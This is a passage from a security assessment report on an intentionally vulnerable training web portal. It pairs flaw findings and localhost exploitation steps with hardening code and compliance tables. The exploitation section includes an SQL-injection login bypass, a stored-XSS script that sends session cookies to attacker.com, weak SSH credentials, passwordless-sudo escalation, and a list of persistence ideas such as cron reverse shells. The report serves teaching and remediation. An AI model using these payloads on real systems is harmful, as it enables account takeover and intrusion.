**CVSS v3.1 Score:** 9.8  
**CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H  
**OWASP Mapping:** A01:2021 - Broken Access Control  
**CWE Mapping:** CWE-269  
**Business Impact:** Complete system compromise, root access, unauthorized command execution, data destruction, service disruption.

**Reproduction Steps:**
1. Navigate to admin/security-settings.php
2. Disable Weak SSH Credentials (enables sudo misconfiguration)
3. SSH to localhost:2222 with student credentials
4. Execute: `sudo whoami`
5. Observe root access without password prompt

#### 8.2.6 Weak Password Hashing

**Description:** Weak password hashing (plaintext storage) when Weak Password Hashing is disabled.

**Evidence:**
- File: app/security/functions.php, lines 109-112
- Vulnerable code: `return $password;` (plaintext)
- No hashing in vulnerable mode

**Severity:** HIGH  
**CVSS v3.1 Score:** 7.5  
**CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N  
**OWASP Mapping:** A02:2021 - Cryptographic Failures  
**CWE Mapping:** CWE-256  
**Business Impact:** Credential exposure via database breach, offline password cracking, account takeover, credential stuffing attacks.

**Reproduction Steps:**
1. Navigate to admin/security-settings.php
2. Disable Weak Password Hashing
3. Register new user or change password
4. Query database: `SELECT password FROM users WHERE email = 'test@example.com';`
5. Observe plaintext password storage

#### 8.2.7 HTTP API Communication

**Description:** HTTP API communication allowing cleartext data transmission when HTTP API Communication is disabled.

**Evidence:**
- File: api/courses.php, api/ping.php
- enforceApiTransportPolicy() function allows HTTP when toggle disabled
- No HTTPS enforcement in vulnerable mode

**Severity:** MEDIUM  
**CVSS v3.1 Score:** 7.5  
**CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N  
**OWASP Mapping:** A02:2021 - Cryptographic Failures  
**CWE Mapping:** CWE-319  
**Business Impact:** Credential interception via network sniffing, man-in-the-middle attacks, data exposure in transit.

**Reproduction Steps:**
1. Navigate to admin/security-settings.php
2. Disable HTTP API Communication
3. Access API via HTTP: http://localhost:8080/api/ping.php
4. Observe successful response without HTTPS redirect
5. Use Wireshark to capture cleartext traffic

#### 8.2.8 Backup File Exposure

**Description:** Backup file exposure allowing direct web access to database backup when Backup File Exposure is disabled.

**Evidence:**
- File: app/security/functions.php, syncBackupFileExposure()
- Backup copied to web-accessible /backups/ directory
- Contains credential hashes

**Severity:** MEDIUM  
**CVSS v3.1 Score:** 6.5  
**CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N  
**OWASP Mapping:** A01:2021 - Broken Access Control  
**CWE Mapping:** CWE-538  
**Business Impact:** Credential exposure, offline password cracking, database structure disclosure, sensitive data exposure.

**Reproduction Steps:**
1. Navigate to admin/security-settings.php
2. Disable Backup File Exposure
3. Access: http://localhost:8080/backups/backup.sql
4. Observe database backup download
5. Review file contents for credential hashes

#### 8.2.9 Weak File Permissions

**Description:** Weak file permissions allowing world-readable sensitive files when Weak File Permissions is disabled.

**Evidence:**
- File: app/security/functions.php, syncFilePermissions()
- Permissions set to 0666 (world-readable/writable)
- Affects backup.sql and student_records.csv

**Severity:** MEDIUM  
**CVSS v3.1 Score:** 6.5  
**CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N  
**OWASP Mapping:** A01:2021 - Broken Access Control  
**CWE Mapping:** CWE-732  
**Business Impact:** Unauthorized file access, data exposure, potential data modification, privacy violation.

**Reproduction Steps:**
1. Navigate to admin/security-settings.php
2. Disable Weak File Permissions
3. Check file permissions: `ls -la storage/backups/backup.sql`
4. Observe 0666 permissions
5. Access file as any user

### 8.3 Consolidated Vulnerability Inventory

| ID | Vulnerability | Severity | CVSS Score | OWASP | CWE | Status |
|---|---|---|---|---|---|---|
| VULN-001 | SQL Injection | CRITICAL | 9.8 | A01 | CWE-89 | Toggleable |
| VULN-002 | Stored XSS | HIGH | 8.1 | A03 | CWE-79 | Toggleable |
| VULN-003 | IDOR | HIGH | 8.1 | A01 | CWE-639 | Toggleable |
| VULN-004 | Weak SSH Credentials | HIGH | 7.5 | A07 | CWE-798 | Toggleable |
| VULN-005 | Sudo Misconfiguration | CRITICAL | 9.8 | A01 | CWE-269 | Toggleable |
| VULN-006 | Weak Password Hashing | HIGH | 7.5 | A02 | CWE-256 | Toggleable |
| VULN-007 | HTTP API Communication | MEDIUM | 7.5 | A02 | CWE-319 | Toggleable |
| VULN-008 | Backup File Exposure | MEDIUM | 6.5 | A01 | CWE-538 | Toggleable |
| VULN-009 | Weak File Permissions | MEDIUM | 6.5 | A01 | CWE-732 | Toggleable |

---

## 9. PHASE 4 - EXPLOITATION ANALYSIS

### 9.1 Web Exploitation

#### 9.1.1 SQL Injection Exploitation

**Attack Objective:** Bypass authentication and gain unauthorized access to admin account.

**Attack Path:**
1. Disable SQL Injection Protection
2. Disable Weak Authentication (due to dependency flaw)
3. Submit SQLi payload in login email field
4. Bypass password verification
5. Authenticate as admin

**Prerequisites:**
- SQL Injection Protection disabled
- Weak Authentication disabled (dependency flaw)
- Valid email address in database

**Payload:**
```
Email: admin@myeduconnect.com' OR '1'='1
Password: anypassword
```

**Reproduction Steps:**
1. Navigate to http://localhost:8080/admin/security-settings.php
2. Uncheck "SQL Injection Protection"
3. Uncheck "Authentication Protection"
4. Click "Save Security Settings"
5. Navigate to http://localhost:8080/login.php
6. Enter email: `admin@myeduconnect.com' OR '1'='1`
7. Enter password: `anypassword`
8. Click "Login"
9. Observe successful authentication as admin

**Expected Result:**
- Login succeeds with any password
- Session established as admin user
- Redirected to admin dashboard
- Full administrative access granted

**Security Impact:**
- Complete authentication bypass
- Unauthorized admin access
- Data compromise
- System control
- Privacy violation

#### 9.1.2 Stored XSS Exploitation

**Attack Objective:** Execute malicious JavaScript in victim's browser to steal session cookies.

**Attack Path:**
1. Disable XSS Protection
2. Inject malicious script in user profile
3. Wait for victim to view profile
4. Script executes in victim's browser
5. Session cookie stolen

**Prerequisites:**
- XSS Protection disabled
- Valid user account
- Victim views infected profile

**Payload:**
```javascript
<script>
var cookie = document.cookie;
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://attacker.com/steal.php?cookie=' + encodeURIComponent(cookie), true);
xhr.send();
</script>
```

**Reproduction Steps:**
1. Navigate to http://localhost:8080/admin/security-settings.php
2. Uncheck "XSS Protection"
3. Click "Save Security Settings"
4. Login as student
5. Navigate to http://localhost:8080/student/profile.php
6. Enter in "About Me" field: `<script>alert(document.cookie)</script>`
7. Click "Update Profile"
8. View profile page
9. Observe JavaScript alert with session cookie

**Expected Result:**
- Script executes when profile is viewed
- Session cookie displayed in alert
- Cookie can be sent to attacker server
- Session hijacking possible

**Security Impact:**
- Session hijacking
- Credential theft
- Unauthorized actions
- Account takeover
- Privacy violation

#### 9.1.3 IDOR Exploitation

**Attack Objective:** Access other users' private profile information.

**Attack Path:**
1. Disable IDOR Protection
2. Login as regular user
3. Enumerate user IDs
4. Access other users' profiles
5. Extract private information

**Prerequisites:**
- IDOR Protection disabled
- Valid user account
- Sequential user IDs

**Payload:**
```
URL: /student/profile.php?id=2
URL: /student/profile.php?id=3
URL: /student/profile.php?id=4
```

**Reproduction Steps:**
1. Navigate to http://localhost:8080/admin/security-settings.php
2. Uncheck "IDOR Protection"
3. Click "Save Security Settings"
4. Login as student (user_id=1)
5. Navigate to http://localhost:8080/student/profile.php?id=2
6. Observe successful access to another student's profile
7. Change id parameter to 3, 4, 5, etc.
8. Enumerate all student profiles

**Expected Result:**
- Access granted to other users' profiles
- Private information displayed
- No access control error
- All user data accessible

**Security Impact:**
- Unauthorized data access
- Privacy violation
- Data harvesting
- Horizontal privilege escalation
- Compliance violation

### 9.2 Server Exploitation

#### 9.2.1 Weak SSH Credentials Exploitation

**Attack Objective:** Gain unauthorized SSH access to the web container.

**Attack Path:**
1. Disable Weak SSH Credentials
2. SSH to exposed port 2222
3. Authenticate with weak credentials
4. Gain shell access

**Prerequisites:**
- Weak SSH Credentials disabled
- SSH port 2222 accessible
- Known weak credentials

**Payload:**
```bash
ssh -p 2222 student@localhost
# Password: password123
```

**Reproduction Steps:**
1. Navigate to http://localhost:8080/admin/security-settings.php
2. Uncheck "Weak SSH Credentials"
3. Click "Save Security Settings"
4. Open terminal
5. Execute: `ssh -p 2222 student@localhost`
6. Enter password: `password123`
7. Observe successful authentication

**Expected Result:**
- SSH login succeeds
- Shell access granted
- User session established
- Command execution possible

**Security Impact:**
- Unauthorized system access
- Lateral movement
- Potential privilege escalation
- System compromise
- Data exfiltration

#### 9.2.2 Sudo Misconfiguration Exploitation

**Attack Objective:** Escalate privileges to root without password.

**Attack Path:**
1. Disable Weak SSH Credentials (enables sudo misconfiguration)
2. SSH with weak credentials
3. Execute sudo commands
4. Gain root access

**Prerequisites:**
- Weak SSH Credentials disabled
- SSH access with student account
- Sudo misconfiguration active

**Payload:**
```bash
sudo whoami
sudo su -
```

**Reproduction Steps:**
1. Navigate to http://localhost:8080/admin/security-settings.php
2. Uncheck "Weak SSH Credentials"
3. Click "Save Security Settings"
4. SSH to container: `ssh -p 2222 student@localhost`
5. Enter password: `password123`
6. Execute: `sudo whoami`
7. Observe root output without password prompt
8. Execute: `sudo su -`
9. Observe root shell

**Expected Result:**
- Sudo executes without password
- Root access granted
- Full system control
- No authentication required

**Security Impact:**
- Complete system compromise
- Root access
- Data destruction
- Service disruption
- Persistence installation

### 9.3 Network Exploitation

#### 9.3.1 HTTP API Communication Exploitation

**Attack Objective:** Intercept cleartext API communication to steal credentials.

**Attack Path:**
1. Disable HTTP API Communication
2. Access API via HTTP
3. Use network sniffer
4. Capture cleartext traffic
5. Extract credentials

**Prerequisites:**
- HTTP API Communication disabled
- Network access to traffic
- Sniffing capability

**Payload:**
```bash
wireshark -i lo -f "port 8080"
curl http://localhost:8080/api/ping.php
```

**Reproduction Steps:**
1. Navigate to http://localhost:8080/admin/security-settings.php
2. Uncheck "HTTP API Communication"
3. Click "Save Security Settings"
4. Start Wireshark: `wireshark -i lo`
5. Filter: `port 8080`
6. Execute: `curl http://localhost:8080/api/ping.php`
7. Observe cleartext HTTP traffic in Wireshark
8. Review captured packets for sensitive data

**Expected Result:**
- API responds via HTTP
- Cleartext traffic visible
- No TLS encryption
- Credentials visible in packets

**Security Impact:**
- Credential interception
- Man-in-the-middle attacks
- Data exposure
- Session hijacking
- Privacy violation

#### 9.3.2 Backup File Exposure Exploitation

**Attack Objective:** Download exposed database backup to extract credentials.

**Attack Path:**
1. Disable Backup File Exposure
2. Access backup URL
3. Download backup file
4. Extract credential hashes
5. Crack passwords offline

**Prerequisites:**
- Backup File Exposure disabled
- Web access to backup URL
- Password cracking tools

**Payload:**
```bash
curl http://localhost:8080/backups/backup.sql -o backup.sql
cat backup.sql | grep password
```

**Reproduction Steps:**
1. Navigate to http://localhost:8080/admin/security-settings.php
2. Uncheck "Backup File Exposure"
3. Click "Save Security Settings"
4. Execute: `curl http://localhost:8080/backups/backup.sql -o backup.sql`
5. Execute: `cat backup.sql`
6. Observe database structure and credential hashes
7. Use John the Ripper to crack hashes

**Expected Result:**
- Backup file downloaded
- Database structure visible
- Credential hashes exposed
- Offline cracking possible
- Passwords recoverable

**Security Impact:**
- Credential exposure
- Offline password cracking
- Account takeover
- Database structure disclosure
- Data breach

### 9.4 Post Exploitation

#### 9.4.1 Privilege Escalation Path

**Initial Access:**
- Weak SSH credentials (student:password123)

**Escalation Method:**
- Sudo misconfiguration allows passwordless sudo
- Execute `sudo su -` to gain root shell

**Root/Admin Access Path:**
```
SSH Access (student) → Sudo Misconfiguration → Root Shell
```

**Post-Exploitation Activities:**
- Install persistence mechanisms
- Exfiltrate sensitive data
- Install backdoors
- Modify system configurations
- Create new user accounts
- Cover tracks

**Persistence Options:**
- Add SSH keys to authorized_keys
- Create cron jobs for reverse shells
- Modify system binaries
- Install rootkits

---

## 10. PHASE 5 - HARDENING REVIEW

### 10.1 Fixed Vulnerabilities (Secure Mode)

#### 10.1.1 SQL Injection - Fixed

**Original Weakness:**
```php
// VULNERABLE MODE: raw SQL concatenation
$query = "SELECT * FROM users WHERE email = '$email' AND status = 'active'";
$stmt = $db->query($query);
```

**Secure Implementation:**
```php
// SECURE MODE: prepared statements
$query = "SELECT * FROM users WHERE email = ? AND status = 'active'";
$user = dbSelectOne($query, [$email]);
```

**Secure Code Evidence:**
- File: app/security/auth.php, lines 15-27
- File: app/security/functions.php, lines 497-521
- Uses PDO prepared statements
- Parameter binding prevents injection
- Input validation via dbSelectOne helper

**Why the Fix Works:**
- Prepared statements separate SQL logic from data
- Parameters are bound, not concatenated
- Database engine treats parameters as data, not code
- SQL injection cannot occur regardless of input content

**Compliance:**
- OWASP ASVS v4.0.3: V5.3.5 (Prepared Statements)
- OWASP Top 10 2021: A01 - Broken Access Control
- CWE-89 mitigation

#### 10.1.2 Stored XSS - Fixed

**Original Weakness:**
```php
// VULNERABLE MODE: raw output
echo $student['about_me'] ?? '';
```

**Secure Implementation:**
```php
// SECURE MODE: HTML encoding
if (!isVulnerabilityEnabled('stored_xss')) {
    echo htmlspecialchars($student['about_me'] ?? '');
}
```

**Secure Code Evidence:**
- File: student/profile.php, lines 191-195
- File: admin/users.php, line 204
- File: admin/announcements.php, lines 30, 244, 261
- Uses htmlspecialchars() for output encoding
- Context-aware encoding

**Why the Fix Works:**
- htmlspecialchars() converts special characters to HTML entities
- `<` becomes `&lt;`, `>` becomes `&gt;`
- Browser displays entities as text, not HTML
- Scripts cannot execute in encoded context

**Compliance:**
- OWASP ASVS v4.0.3: V3.3.4 (Output Encoding)
- OWASP Top 10 2021: A03 - Injection
- CWE-79 mitigation

#### 10.1.3 IDOR - Fixed

**Original Weakness:**
```php
// VULNERABLE MODE: allow any user ID
$query = "SELECT * FROM users WHERE user_id = ?";
return dbSelectOne($query, [$userId]);
```

**Secure Implementation:**
```php
// SECURE MODE: validate ownership
if ($checkOwnership && !isVulnerabilityEnabled('idor')) {
    $currentUserId = getCurrentUserId();
    $currentUserRole = getCurrentUserRole();
    
    if ($currentUserRole === 'admin') {
        $query = "SELECT * FROM users WHERE user_id = ?";
        return dbSelectOne($query, [$userId]);
    }
    
    if ($currentUserId != $userId) {
        return null;
    }
    
    $query = "SELECT * FROM users WHERE user_id = ?";
    return dbSelectOne($query, [$userId]);
}
```

**Secure Code Evidence:**
- File: app/security/functions.php, lines 338-360
- Ownership validation before data access
- Role-based access control (admin bypass)
- Returns null for unauthorized access

**Why the Fix Works:**
- Validates current user owns requested resource
- Admins can access any resource (by design)
- Non-admins can only access their own data
- Direct object reference prevented

**Compliance:**
- OWASP ASVS v4.0.3: V1.4.2 (Access Control)
- OWASP Top 10 2021: A01 - Broken Access Control
- CWE-639 mitigation

#### 10.1.4 Weak Password Hashing - Fixed

**Original Weakness:**
```php
// VULNERABLE MODE: plaintext storage
if (isVulnerabilityEnabled('weak_password_hashing')) {
    return $password;
}
```

**Secure Implementation:**
```php
// SECURE MODE: bcrypt hashing
return password_hash($password, PASSWORD_BCRYPT);
```

**Secure Code Evidence:**
- File: app/security/functions.php, lines 109-114
- Uses PASSWORD_BCRYPT algorithm
- Automatic salt generation
- Work factor of 10

**Why the Fix Works:**
- Bcrypt is designed for password hashing
- Automatic salt prevents rainbow table attacks
- Work factor slows down brute force attacks
- One-way hash prevents plaintext recovery

**Compliance:**
- OWASP ASVS v4.0.3: V2.1.1 (Password Storage)
- OWASP Password Storage Cheat Sheet
- OWASP Top 10 2021: A02 - Cryptographic Failures
- CWE-256 mitigation

#### 10.1.5 HTTP API Communication - Fixed

**Original Weakness:**
- HTTP communication allowed
- No HTTPS enforcement
- Cleartext data transmission

**Secure Implementation:**
```php
function enforceApiTransportPolicy() {
    if (isVulnerabilityEnabled('http_api_communication')) {
        // Allow HTTP for demonstration
        return;
    }
    
    if (!isRequestHttps()) {
        http_response_code(403);
        echo json_encode(['error' => 'HTTPS required']);
        exit();
    }
}
```

**Secure Code Evidence:**
- File: app/security/functions.php, enforceApiTransportPolicy()
- HTTPS enforcement for API endpoints
- 403 Forbidden for HTTP requests
- Transport policy validation

**Why the Fix Works:**
- HTTPS encrypts data in transit
- Prevents man-in-the-middle attacks
- Protects credentials from interception
- TLS provides authentication and integrity

**Compliance:**
- OWASP ASVS v4.0.3: V9.2.1 (HTTPS)
- OWASP Top 10 2021: A02 - Cryptographic Failures
- CWE-319 mitigation

#### 10.1.6 Backup File Exposure - Fixed

**Original Weakness:**
- Backup file copied to web-accessible directory
- Direct URL access possible
- No access controls

**Secure Implementation:**
```php
function syncBackupFileExposure() {
    $backupPath = __DIR__ . '/../../storage/backups/backup.sql';
    $webBackupPath = __DIR__ . '/../../backups/backup.sql';
    
    if (isVulnerabilityEnabled('backup_file_exposure')) {
        copy($backupPath, $webBackupPath);
    } else {
        if (file_exists($webBackupPath)) {
            unlink($webBackupPath);
        }
    }
}
```

**Secure Code Evidence:**
- File: app/security/functions.php, syncBackupFileExposure()
- Backup removed from web-accessible location
- Storage directory not web-accessible
- File deletion on secure mode

**Why the Fix Works:**
- Backup file not accessible via web
- Stored in non-web-accessible directory
- No direct URL access possible
- Proper file separation

**Compliance:**
- OWASP ASVS v4.0.3: V6.2.1 (File Access)
- OWASP Top 10 2021: A01 - Broken Access Control
- CWE-538 mitigation

#### 10.1.7 Weak File Permissions - Fixed

**Original Weakness:**
```php
// VULNERABLE: world-readable
$perms = '0666';
```

**Secure Implementation:**
```php
// SECURE: restrictive
$perms = '0640';
```

**Secure Code Evidence:**
- File: app/security/functions.php, syncFilePermissions()
- Permissions set to 0640 (owner read/write, group read)
- World permissions removed
- Applied to sensitive files

**Why the Fix Works:**
- Restrictive permissions limit access
- Only owner and group can read
- World cannot access files
- Principle of least privilege

**Compliance:**
- OWASP ASVS v4.0.3: V6.2.2 (File Permissions)
- OWASP Top 10 2021: A01 - Broken Access Control
- CWE-732 mitigation

#### 10.1.8 Weak SSH Credentials - Fixed

**Original Weakness:**
```bash
WEAK_PASS="password123"
printf 'student:%s\n' "$WEAK_PASS" > "$CRED_FILE"
```

**Secure Implementation:**
```bash
STRONG_PASS="Str0ng!Lab#Pass_2026"
printf 'student:%s\n' "$STRONG_PASS" > "$CRED_FILE"
printf 'student:%s\n' "$STRONG_PASS" | chpasswd -c SHA512
```

**Secure Code Evidence:**
- File: scripts/disable_weak_ssh.sh
- Strong password with complexity
- SHA512 hashing
- Credential file management

**Why the Fix Works:**
- Strong password resists brute force
- SHA512 hashing protects stored credentials
- Complex password meets security standards
- Regular password rotation recommended

**Compliance:**
- OWASP ASVS v4.0.3: V2.1.3 (Password Complexity)
- OWASP Top 10 2021: A07 - Identification and Authentication Failures
- CWE-798 mitigation

#### 10.1.9 Sudo Misconfiguration - Fixed

**Original Weakness:**
```bash
echo 'student ALL=(ALL) NOPASSWD:ALL' > "$SUDOERS_FILE"
```

**Secure Implementation:**
```bash
if [ -f "$SUDOERS_FILE" ]; then
    rm -f "$SUDOERS_FILE"
    echo "[+] Removed weak sudo configuration"
fi
```

**Secure Code Evidence:**
- File: scripts/disable_weak_sudo.sh
- Sudoers file removed
- No passwordless sudo
- Proper privilege management

**Why the Fix Works:**
- Removes passwordless sudo configuration
- Requires password for sudo access
- Prevents unauthorized privilege escalation
- Follows least privilege principle

**Compliance:**
- OWASP ASVS v4.0.3: V1.4.1 (Privilege Management)
- OWASP Top 10 2021: A01 - Broken Access Control
- CWE-269 mitigation

### 10.2 Unfixed Vulnerabilities (Design Flaws)

#### 10.2.1 SQL Injection ↔ Weak Authentication Dependency

**Issue:** SQL Injection and Weak Authentication toggles have dependency coupling.

**Evidence:**
- File: app/security/auth.php, lines 47-54
- Password verification skipped only when SQLi is also disabled
- Cannot demonstrate SQLi bypass independently

**Current Implementation (FLAWED):**
```php
if (!isVulnerabilityEnabled('sqli_enabled')) {
    // Password verification skipped for SQLi demo
} else {
    // Still verify password if SQLi is protected
    if (!verifyPassword($password, $user['password'])) {
        return ['success' => false, 'message' => 'Invalid email or password'];
    }
}
```

**Exact Remediation Steps:**

**Code-Level Fix:**
```php
// Remove SQLi dependency from password verification
if (isProtectionEnabled('weak_auth_enabled')) {
    // SECURE - Verify password with bcrypt
    if (!verifyPassword($password, $user['password'])) {
        return ['success' => false, 'message' => 'Invalid email or password'];
    }
} else {
    // VULNERABLE - Skip password verification
    // Do not check SQLi state
}
```

**Configuration Fix:**
- Remove dependency documentation
- Update attack testing guides
- Clarify independent toggle behavior

**Testing Fix:**
- Test SQLi bypass with Weak Auth enabled
- Test Weak Auth bypass with SQLi enabled
- Verify independent operation

#### 10.2.2 File Upload Vulnerability - Not Fully Implemented

**Issue:** File Upload vulnerability documented in README but toggle not fully implemented.

**Evidence:**
- README.md mentions File Upload Vulnerability
- UPLOAD_ENABLED environment variable exists
- uploadFile() function appears secure only
- No vulnerable path implemented

**Current Implementation:**
```php
function uploadFile($file, $destination, $allowedTypes = null) {
    // SECURE VERSION only - no vulnerable path
    // File size check, extension whitelist, MIME type check
}
```

**Exact Remediation Steps:**

**Code-Level Fix:**
```php
function uploadFile($file, $destination, $allowedTypes = null) {
    if (isVulnerabilityEnabled('upload_enabled')) {
        // VULNERABLE MODE - minimal validation
        $targetPath = $destination . basename($file['name']);
        return move_uploaded_file($file['tmp_name'], $targetPath);
    } else {
        // SECURE MODE - full validation
        // Existing secure implementation
    }
}
```

**Configuration Fix:**
- Add UPLOAD_ENABLED to security-settings.php
- Implement toggle in admin panel
- Add to vulnerability definitions array

**Docker Fix:**
- Ensure uploads directory permissions
- Configure Apache to allow script execution in uploads

#### 10.2.3 CSRF Vulnerability - Not Implemented

**Issue:** CSRF vulnerability documented in README but toggle not implemented.

**Evidence:**
- README.md mentions CSRF Vulnerability
- CSRF_ENABLED environment variable exists
- CSRF protection always active
- No vulnerable path implemented

**Current Implementation:**
```php
// CSRF protection always active
if (!verifyCSRFToken($_POST['csrf_token'])) {
    $error = 'Invalid request. Please try again.';
}
```

**Exact Remediation Steps:**

**Code-Level Fix:**
```php
if (isVulnerabilityEnabled('csrf_enabled')) {
    // VULNERABLE MODE - skip CSRF verification
    // Allow POST without token
} else {
    // SECURE MODE - verify CSRF token
    if (!verifyCSRFToken($_POST['csrf_token'])) {
        $error = 'Invalid request. Please try again.';
    }
}
```

**Configuration Fix:**
- Add CSRF_ENABLED to security-settings.php
- Implement toggle in admin panel
- Add to vulnerability definitions array

### 10.3 Compliance Verification

#### 10.3.1 OWASP ASVS Compliance

| ASVS Requirement | Status | Evidence |
|---|---|---|
| V1.4.1 Access Control | PARTIAL | RBAC implemented, IDOR toggleable |
| V1.4.2 IDOR Protection | PARTIAL | Ownership checks with toggle |
| V2.1.1 Password Storage | COMPLIANT | Bcrypt hashing in secure mode |
| V2.1.3 Password Complexity | PARTIAL | Minimum length only |
| V3.3.4 Output Encoding | PARTIAL | htmlspecialchars with toggle |
| V5.3.5 Prepared Statements | PARTIAL | PDO with toggle |
| V6.2.1 File Access | PARTIAL | Backup exposure toggleable |
| V6.2.2 File Permissions | PARTIAL | Permissions toggleable |
| V9.2.1 HTTPS | PARTIAL | API HTTPS enforcement toggleable |

#### 10.3.2 OWASP Top 10 (2021) Compliance

| Risk | Status | Evidence |
|---|---|---|
| A01: Broken Access Control | PARTIAL | IDOR, sudo misconfig toggleable |
| A02: Cryptographic Failures | PARTIAL | Password hashing, HTTPS toggleable |
| A03: Injection | PARTIAL | SQLi, XSS toggleable |
| A04: Insecure Design | N/A | Not applicable |
| A05: Security Misconfiguration | PARTIAL | File permissions, backup exposure toggleable |
| A06: Vulnerable Components | N/A | No third-party vulns identified |
| A07: Auth Failures | PARTIAL | Weak SSH, weak auth toggleable |
| A08: Data Integrity Failures | N/A | Not applicable |
| A09: Logging Failures | COMPLIANT | Audit logging implemented |
| A10: SSRF | NOT IMPLEMENTED | SSRF not implemented |

#### 10.3.3 OWASP Password Storage Cheat Sheet Compliance

| Requirement | Status | Evidence |
|---|---|
| Use modern hashing algorithm | COMPLIANT | Bcrypt (PASSWORD_BCRYPT) |
| Include salt | COMPLIANT | Bcrypt automatic salt |
| Use appropriate work factor | COMPLIANT | Bcrypt default work factor |
| Don't use outdated algorithms | COMPLIANT | No MD5/SHA1 in secure mode |
| Hash on server side | COMPLIANT | Server-side hashing |
| Don't limit password length | COMPLIANT | VARCHAR(255) storage |

#### 10.3.4 OWASP Session Management Cheat Sheet Compliance

| Requirement | Status | Evidence |
|---|---|
| Use secure session IDs | COMPLIANT | PHP session management |
| Implement session timeout | COMPLIANT | SESSION_LIFETIME configuration |
| Regenerate session on login | PARTIAL | Not explicitly implemented |
| Use secure cookie flags | PARTIAL | Not explicitly configured |
| Implement logout properly | COMPLIANT | Session destroy on logout |

---

## 11. PHASE 5 - IDS/WAF ANALYSIS

### 11.1 IDS/WAF Implementation Status

**Finding:** No IDS/WAF rules are implemented in this project.

**Evidence:**
- Grep search for "snort", "suricata", "modsecurity", "waf", "ids" returned no configuration files
- No IDS/WAF directories found
- No rule files present
- No IDS/WAF documentation

**Analysis:**
This is an educational cybersecurity training platform designed to demonstrate vulnerabilities. IDS/WAF implementation is not required for this purpose. The platform focuses on vulnerability demonstration rather than protection.

**Recommendation:**
For a production deployment, the following IDS/WAF solutions should be considered:
- ModSecurity for Apache
- Snort for network intrusion detection
- Suricata as an alternative to Snort
- Web Application Firewall (WAF) for application-level protection

---

## 12. PHASE 5 - CRYPTOGRAPHY REVIEW

### 12.1 Password Storage

**Current Implementation:**
- Algorithm: Bcrypt (PASSWORD_BCRYPT)
- Salt: Automatic (handled by bcrypt)
- Work Factor: Default (10)
- Storage: VARCHAR(255) in database

**Assessment:**
- **Secure Mode:** COMPLIANT with OWASP Password Storage Cheat Sheet
- **Vulnerable Mode:** Plaintext storage (intentional for demonstration)

**Best Practice Compliance:**
- ✅ Uses modern hashing algorithm (bcrypt)
- ✅ Automatic salt generation
- ✅ Appropriate work factor
- ✅ Sufficient storage length
- ✅ Server-side hashing
- ⚠️ No password complexity enforcement (only minimum length)

**Recommendations:**
1. Implement password complexity requirements
2. Add password strength meter
3. Implement password history checking
4. Add breached password checking
5. Consider Argon2 as alternative to bcrypt

### 12.2 Session Tokens

**Current Implementation:**
- Mechanism: PHP native sessions
- Session ID: PHPSESSID
- Session Name: Configurable (SESSION_NAME)
- Session Lifetime: Configurable (SESSION_LIFETIME)
- Storage: File-based (default PHP)

**Assessment:**
- **Secure Mode:** PARTIALLY COMPLIANT
- **Vulnerable Mode:** Not applicable (session management not toggleable)

**Best Practice Compliance:**
- ✅ Session timeout implemented
- ✅ Session name configurable
- ✅ Session destroy on logout
- ❌ Session ID regeneration not implemented
- ❌ Secure cookie flags not configured
- ❌ HTTP-only flag not set
- ❌ SameSite attribute not set

**Recommendations:**
1. Implement session ID regeneration on login
2. Set secure cookie flag for HTTPS
3. Set HTTP-only flag to prevent JavaScript access
4. Set SameSite attribute to prevent CSRF
5. Consider database session storage for scalability

### 12.3 Cookies

**Current Implementation:**
- Session cookie: PHPSESSID
- CSRF token: Session-based
- No persistent cookies

**Assessment:**
- **Secure Mode:** PARTIALLY COMPLIANT
- Cookie security flags not explicitly configured

**Best Practice Compliance:**
- ❌ Secure flag not set
- ❌ HTTP-only flag not set
- ❌ SameSite attribute not set
- ✅ No sensitive data in cookies
- ✅ Session-based tokens

**Recommendations:**
1. Configure session cookie parameters in php.ini
2. Set session.cookie_secure = 1 for HTTPS
3. Set session.cookie_httponly = 1
4. Set session.cookie_samesite = Strict
5. Implement cookie prefixing (__Secure-, __Host-)

### 12.4 TLS

**Current Implementation:**
- Certificate: Self-signed
- Protocol: TLS 1.2/1.3 (Apache default)
- Cipher suites: Apache default
- HTTP to HTTPS redirect: Not configured

**Assessment:**
- **Secure Mode:** PARTIALLY COMPLIANT
- Self-signed certificate (intentional for HTTP API demonstration)

**Best Practice Compliance:**
- ❌ Self-signed certificate (not trusted)
- ❌ No certificate from trusted CA
- ❌ HTTP to HTTPS redirect not enforced
- ❌ HSTS header not configured
- ✅ TLS 1.2/1.3 supported
- ⚠️ Cipher suite configuration not specified

**Recommendations:**
1. Use certificate from trusted CA for production
2. Enforce HTTP to HTTPS redirect
3. Implement HSTS header
4. Configure secure cipher suites
5. Disable weak protocols (SSLv3, TLS 1.0, TLS 1.1)
6. Implement certificate pinning for mobile apps

### 12.5 Authentication Flow

**Current Implementation:**
- Registration: Email + password
- Login: Email + password
- Password verification: Bcrypt
- Session establishment: PHP sessions
- Password change: Current password verification required

**Assessment:**
- **Secure Mode:** COMPLIANT
- **Vulnerable Mode:** Password verification skippable (intentional)

**Best Practice Compliance:**
- ✅ Password hashing with bcrypt
- ✅ Password verification on login
- ✅ Current password verification for change
- ✅ Session-based authentication
- ❌ No multi-factor authentication
- ❌ No account lockout mechanism
- ❌ No password complexity enforcement
- ❌ No password history checking

**Recommendations:**
1. Implement multi-factor authentication
2. Add account lockout after failed attempts
3. Implement password complexity requirements
4. Add password history checking
5. Implement password expiry policy
6. Add CAPTCHA for login attempts

---

## 13. PHASE 5 - RETEST MATRIX

| Attack | Previous Result (Vulnerable Mode) | Current Result (Secure Mode) | Status |
|---|---|---|---|
| SQL Injection (Login Bypass) | Authentication bypass successful | Login blocked, prepared statements active | FIXED |
| SQL Injection (Search) | SQL syntax error or data extraction | Safe parameterized query | FIXED |
| Stored XSS (Profile) | Script executes in browser | Script encoded as text, no execution | FIXED |
| Stored XSS (Announcements) | Script executes in browser | Script encoded as text, no execution | FIXED |
| IDOR (Profile Access) | Access to any user profile | Access denied, ownership validated | FIXED |
| IDOR (Course Edit) | Edit any teacher's course | Access denied, ownership validated | FIXED |
| Weak SSH Credentials | Login with weak password | Strong password required | FIXED |
